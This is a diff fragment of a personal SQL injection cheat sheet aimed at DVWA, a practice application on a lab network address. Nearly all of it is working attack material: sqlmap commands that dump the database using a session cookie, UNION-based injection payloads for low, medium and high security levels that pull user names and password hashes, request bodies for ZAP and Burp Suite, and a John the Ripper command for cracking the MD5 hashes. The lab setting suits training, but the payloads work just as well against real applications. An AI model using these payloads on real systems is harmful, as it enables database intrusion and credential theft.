@@ -17,3 +17,57 @@ SQL-DVWA  High:
 $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=sv0m9s1dv0kp23lv9ajjtsbrfn; security=high" --data="id=3&Submit=Submit" --second-url http://192.168.100.8/dvwa/vulnerabilities/sqli/ --dbs
 $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=sv0m9s1dv0kp23lv9ajjtsbrfn; security=high" --data="id=3&Submit=Submit" --second-url http://192.168.100.8/dvwa/vulnerabilities/sqli/ -D dvwa -tables  
 $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=sv0m9s1dv0kp23lv9ajjtsbrfn; security=high" --data="id=3&Submit=Submit" --second-url http://192.168.100.8/dvwa/vulnerabilities/sqli/ -D dvwa -tables --dump 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DVWA SQL Injection (Manual, Zaproxy & Burpsuite)
+
+DVWA Low: 
+1' ORDER BY 2-- #
+1' ORDER BY 2 #
+1' OR 1=1 UNION SELECT 1, VERSION()#
+1' OR 1=1 UNION SELECT 1, VERSION()#
+1' OR 1=1 UNION SELECT 1,DATABASE() #
+1' OR 1=1 UNION SELECT 1,table_name FROM  information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' #
+1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
+1' OR 1=1 UNION SELECT user, password FROM users #      
+           
+           
+          
+DVWA (Low):
+           
+%' or '0'='0
+%' or 0=0 union select null, version() #    //Displaying version
+%' or 0=0 union select null, user() #
+%' or 0=0 union select null, database() #
+%' and 1=0 union select null, table_name from information_schema.tables #
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'users%'#
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' # // Add two strings together
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+$ john -format:raw-MD5 database\ user\ password.txt
+
+
+DVWA SQL Injection (Medium) using zaproxy:
+Inserting folling query in "zaproxy manual request editor"
+
+id=2 or 0=0 union select null, version() &Submit=Submit
+id=2 or 0=0 union select null, database() &Submit=Submit
+id=2 union select null, table_name from information_schema.tables &Submit=Submit
+id=2 UNION SELECT user, password FROM users &Submit=Submit
+
+DVWA SQL Injection (Medium) using burpsuite:
+After capturing the packet send it to repeater
+id=1 or 1=1#&Submit=Submit
+id=2 or 0=0 union select null, user() #&Submit=Submit
+id=2 or 1=0 union select null, table_name from information_schema.tables #&Submit=Submit
+id=2 or 1=1 union select 1,column_name from information_schema.columns# &Submit=Submit
+id=2 or 1=0 union select 1,group_concat(user,password) from users#  &Submit=Submit
+id=2 UNION SELECT user, password FROM users # &Submit=Submit
+
+
+DVWA SQL Injection (High) manually:
+1' OR 1=1 UNION SELECT user, password FROM users#
+1' OR 1=1 UNION SELECT password, @@hostname FROM users#
+1' union select 1,column_name from information_schema.columns where table_name="users"#
+1' union select user,password from users#
+
+
